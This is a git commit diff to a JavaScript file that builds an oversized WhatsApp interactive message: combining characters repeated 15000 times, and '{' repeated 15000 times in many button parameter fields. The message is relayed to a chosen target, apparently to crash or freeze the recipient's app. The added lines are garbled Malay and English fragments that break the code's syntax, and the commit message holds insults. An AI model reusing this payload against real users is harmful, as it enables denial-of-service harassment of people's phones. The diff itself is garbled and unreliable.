e0f2fbd4823c2d6ed1fc765ae00568a5906d36a3
taufiq461 <topektopek4674@gmail.com>
2025-10-04 16:55:18 +0800

    Update BlankUiRims.js topek
    jgn bukak ini untuk ahli sahaja admin pt 
    topek izz akim monyet

--- BlankUiRims.js
+++ BlankUiRims.js
@@ -13,34 +13,34 @@ message: {
 messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2, },
 interactiveMessage: {
 contextInfo: {
-mentionedJid: [target],
+mentionedJid: [target] ios android laptop tv pc
 isForwarded: true,
 forwardingScore: 99999999,
 businessMessageForwardInfo: {
-businessOwnerJid: target,
+businessOwnerJid: target,wasap biasa
 },
 },
 body: { text: "floare Rims🤬😈" + "⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟".repeat(15000), },
 nativeFlowMessage: { messageParamsJson: "{".repeat(15000),
 buttons: [
-{ name: "single_select", ParamsJson: "{".repeat(15000), version: 3 },
-{ name: "call_permission_request", ParamsJson: "{".repeat(15000), version: 3 },
-{ name: "cta_url", ParamsJson: "{".repeat(15000), version: 3 },
-{ name: "cta_call", ParamsJson: "{".repeat(15000), version: 3 },
-{ name: "cta_copy", ParamsJson: "{".repeat(15000), version: 3 },
-{ name: "cta_reminder", ParamsJson: "{".repeat(15000), version: 3 },
-{ name: "cta_cancel_reminder", ParamsJson: "{".repeat(15000), version: 3 },
-{ name: "address_message", ParamsJson: "{".repeat(15000), version: 3 },
-{ name: "send_location", ParamsJson: "{".repeat(15000), version: 3 },
-{ name: "quick_reply", ParamsJson: "{".repeat(15000), version: 3 },
-{ name: "mpm", ParamsJson: "{".repeat(10000), version: 3 },
-],
-},
+{ name: "call_permission_request", ParamsJson: "{".repeat(15000), version: 5},
+{ name: "cta_url", ParamsJson: "{".repeat(15000), version: 5 },
+{ name: "cta_call", ParamsJson: "{".repeat(15000), version: 5 },
+{ name: "cta_copy", ParamsJson: "{".repeat(15000), version: 5 },
+{ name: "cta_reminder", ParamsJson: "{".repeat(15000), version: 5 },
+{ name: "cta_cancel_reminder", ParamsJson: "{".repeat(15000), version: 5 },
+{ name: "address_message", ParamsJson: "{".repeat(15000), version: 5 },
+{ name: "send_location", ParamsJson: "{".repeat(15000), version: 5 },
+{ name: "quick_reply", ParamsJson: "{".repeat(15000), version: 5 },
+{ name: "mpm", ParamsJson: "{".repeat(10000), version: 5 }, 
+],name: "npm start run bot prem jasa bug version 5 update 2028
+},nama  "npm install run bot panel atau termux java sc bug wasap atau telegram
+ 
 },
 },
 },
 };
-await rims.relayMessage(target, message, { participant: { jid: target }, } ); }
+await rims.relayMessage(target, message, { participant: { jid: target }, } ); } saya kereta saya pakai wasap rasmi rasmi wasap kedai dan saya teah pakai wasap rasmi ori target ip 7; android 5675
 
 /*
  JIKA MELIHAT ORNG/PT SAYA YG MENYEBABKAN FUNCTION INI MOHON LAPORKAN SAYA ( @GyzenVtx ), Lu Bakal Gw Kasih 1 Function Privat Gw Jika Melaporkan Jika Patner Gw Ada Yg Nyebar Function Ini 
